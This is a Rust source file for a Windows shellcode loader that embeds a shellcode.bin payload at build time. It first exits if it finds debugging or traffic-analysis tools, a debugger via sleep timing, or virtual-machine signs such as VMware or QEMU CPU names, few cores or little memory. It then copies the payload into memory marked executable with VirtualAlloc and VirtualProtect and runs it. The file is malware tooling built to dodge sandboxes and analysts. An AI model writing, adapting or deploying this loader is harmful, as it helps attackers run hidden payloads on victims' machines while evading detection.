use std::time::Instant;
use std::thread;
use log::{info, error};
use env_logger;
use sysinfo::{System, SystemExt};
use sysinfo::CpuExt;
use winapi::um::memoryapi::{VirtualAlloc, VirtualProtect};
use winapi::um::winnt::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, PAGE_READWRITE};
use std::ptr;
use sysinfo::ProcessExt;

const CHECK_INTERVAL: u64 = 100;
const DEBUG_THRESHOLD_MS: u128 = 5;
const VM_CHECK_REFRESH_INTERVAL_MS: u64 = 1000;

static SHELLCODE: &[u8] = include_bytes!(concat!(env!("OUT_DIR"), "/shellcode.bin"));

fn anti_debug_check() -> Result<bool, std::time::SystemTimeError> {
    let start = Instant::now();
    for _ in 0..CHECK_INTERVAL {
        let before_sleep = Instant::now();
        thread::sleep(std::time::Duration::from_millis(1));
        let after_sleep = Instant::now();
        
        if after_sleep.duration_since(before_sleep).as_millis() > DEBUG_THRESHOLD_MS {
            return Ok(true); // Possible debugger detected
        }
    }
    Ok(false)
}

fn anti_vm_check() -> Result<bool, Box<dyn std::error::Error>> {
    let mut system = System::new_all();
    system.refresh_system();
    thread::sleep(std::time::Duration::from_millis(VM_CHECK_REFRESH_INTERVAL_MS));
    system.refresh_all();

    // Check processor name for VM signatures
    let processor_name = system.global_cpu_info().brand().to_lowercase();
    let vm_signatures = [
        "vmware",
        "virtualbox",
        "kvm",
        "qemu",
        "hyperv",
        "xen",
        "parallels"
    ];

    // Check CPU characteristics
    let cpu_count = system.cpus().len();
    if cpu_count < 2 {
        return Ok(true); // Suspicious single CPU configuration
    }

    // Check available memory
    let total_memory = system.total_memory();
    if total_memory < 2 * 1024 * 1024 { // Less than 2GB RAM
        return Ok(true);
    }

    Ok(vm_signatures.iter().any(|sig| processor_name.contains(sig)))
}

unsafe fn execute_shellcode(shellcode: &[u8]) -> Result<(), Box<dyn std::error::Error>> {
    if shellcode.is_empty() {
        return Err("Empty shellcode provided".into());
    }

    let size = shellcode.len();
    let ptr = VirtualAlloc(
        ptr::null_mut(),
        size,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );

    if ptr.is_null() {
        return Err("Failed to allocate memory".into());
    }

    ptr::copy_nonoverlapping(shellcode.as_ptr(), ptr as *mut u8, size);

    let mut old = PAGE_READWRITE;
    if VirtualProtect(ptr, size, PAGE_EXECUTE_READWRITE, &mut old) == 0 {
        return Err("Failed to change memory protection".into());
    }

    let func: extern "C" fn() = std::mem::transmute(ptr);
    func();

    Ok(())
}

fn check_running_processes() -> Result<bool, Box<dyn std::error::Error>> {
    let mut system = System::new_all();
    system.refresh_processes();

    let suspicious_processes = [
        "ida",
        "ollydbg",
        "x64dbg",
        "windbg",
        "processhacker",
        "procexp",
        "wireshark",
        "fiddler",
    ];

    for (_, process) in system.processes() {
        let process_name = process.name().to_lowercase();
        if suspicious_processes.iter().any(|&name| process_name.contains(name)) {
            return Ok(true);
        }
    }

    Ok(false)
}

fn main() -> Result<(), Box<dyn std::error::Error>> {
    env_logger::builder()
        .filter_level(log::LevelFilter::Info)
        .init();

    // Check for analysis tools
    match check_running_processes() {
        Ok(true) => {
            error!("Analysis tools detected, exiting...");
            return Ok(());
        }
        Err(e) => {
            error!("Error checking processes: {}", e);
            return Err(e);
        }
        _ => info!("Process check passed."),
    }

    match anti_debug_check() {
        Ok(true) => {
            error!("Debugger detected, exiting...");
            return Ok(());
        }
        Err(e) => {
            error!("Error during anti-debug check: {}", e);
            return Err(Box::new(e));
        }
        _ => info!("Anti-debug check passed."),
    }

    match anti_vm_check() {
        Ok(true) => {
            error!("VM environment detected, exiting...");
            return Ok(());
        }
        Err(e) => {
            error!("Error during VM check: {}", e);
            return Err(e);
        }
        _ => info!("Anti-VM check passed."),
    }

    info!("Security checks passed, preparing to execute shellcode.");

    unsafe {
        match execute_shellcode(SHELLCODE) {
            Ok(_) => info!("Shellcode executed successfully."),
            Err(e) => {
                error!("Error executing shellcode: {}", e);
                return Err(e);
            }
        }
    }

    Ok(())
}